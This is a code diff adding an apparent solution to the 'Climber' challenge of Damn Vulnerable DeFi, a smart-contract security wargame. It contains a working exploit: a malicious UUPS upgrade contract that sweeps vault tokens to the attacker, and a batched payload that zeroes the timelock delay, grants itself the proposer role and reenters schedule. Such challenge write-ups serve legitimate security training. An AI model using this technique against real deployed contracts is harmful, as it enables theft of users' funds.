@@ -9,6 +9,12 @@ import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
 import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
 
+import {AccessControl} from "openzeppelin-contracts/access/AccessControl.sol";
+import {Initializable} from "openzeppelin-contracts-upgradeable/proxy/utils/Initializable.sol";
+import {OwnableUpgradeable} from "openzeppelin-contracts-upgradeable/access/OwnableUpgradeable.sol";
+import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
+
 contract Climber is Test {
     uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;
 
@@ -72,7 +78,15 @@ contract Climber is Test {
         /**
          * EXPLOIT START *
          */
+        // we want to update the implementation contract to the malicious contract.
+        Faker faker = new Faker();
 
+        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) =
+            getPayload(climberTimelock, ClimberVault(address(climberVaultProxy)), dvt, attacker, faker);
+
+        // nothing is scheduled yet but this `execute` method violates the check-effects-interactions pattern.
+        // we can reenter the schedule function and register the operation.
+        climberTimelock.execute(targets, values, dataElements, salt);
         /**
          * EXPLOIT END *
          */
@@ -87,4 +101,68 @@ contract Climber is Test {
         assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
         assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
     }
+}
+
+/// @dev This contract have to implement UUPSUpgradeable::proxiableUUID()
+contract Faker is UUPSUpgradeable {
+    /// @dev Entry point for the exploit
+    function sweepAll(address token, address recipient) external {
+        IERC20(token).transfer(recipient, IERC20(token).balanceOf(address(this)));
+    }
+
+    /// @dev register the operation in the TimeLock contract
+    function register(
+        ClimberTimelock climberTimelock,
+        ClimberVault climberVaultProxy,
+        DamnValuableToken dvt,
+        address attacker,
+        Faker faker
+    ) public {
+        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) =
+            getPayload(climberTimelock, ClimberVault(address(climberVaultProxy)), dvt, attacker, faker);
+
+        ClimberTimelock(climberTimelock).schedule(targets, values, dataElements, salt);
+    }
+
+    function _authorizeUpgrade(address newImplementation) internal override {}
+}
+
+/// @dev get the payload for the schedule function
+function getPayload(
+    ClimberTimelock climberTimelock,
+    ClimberVault climberVaultProxy,
+    DamnValuableToken dvt,
+    address attacker,
+    Faker faker
+) returns (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) {
+    uint256 length = 4;
+    targets = new address[](length);
+    values = new uint[](length);
+    dataElements = new bytes[](length);
+
+    // update delay to zero. This will allow us to schedule a transaction immediately
+    targets[0] = address(climberTimelock);
+    dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, uint64(0));
+
+    // grant faker the PROPOSER_ROLE to allow it to schedule transactions
+    targets[1] = address(climberTimelock);
+    dataElements[1] =
+        abi.encodeWithSelector(AccessControl.grantRole.selector, climberTimelock.PROPOSER_ROLE(), address(faker));
+
+    // upgrade the vault to the faker contract
+    // sweep all tokens to the attacker
+    targets[2] = address(climberVaultProxy);
+    bytes memory data = abi.encodeWithSelector(Faker.sweepAll.selector, address(dvt), attacker);
+    dataElements[2] = abi.encodeWithSelector(UUPSUpgradeable.upgradeToAndCall.selector, address(faker), data);
+
+    // reenter the schedule function and call the schedule function on the TimeLock contract
+    targets[3] = address(faker);
+    dataElements[3] = abi.encodeWithSelector(
+        Faker.register.selector,
+        address(climberTimelock),
+        address(climberVaultProxy),
+        address(dvt),
+        attacker,
+        address(faker)
+    );
 }
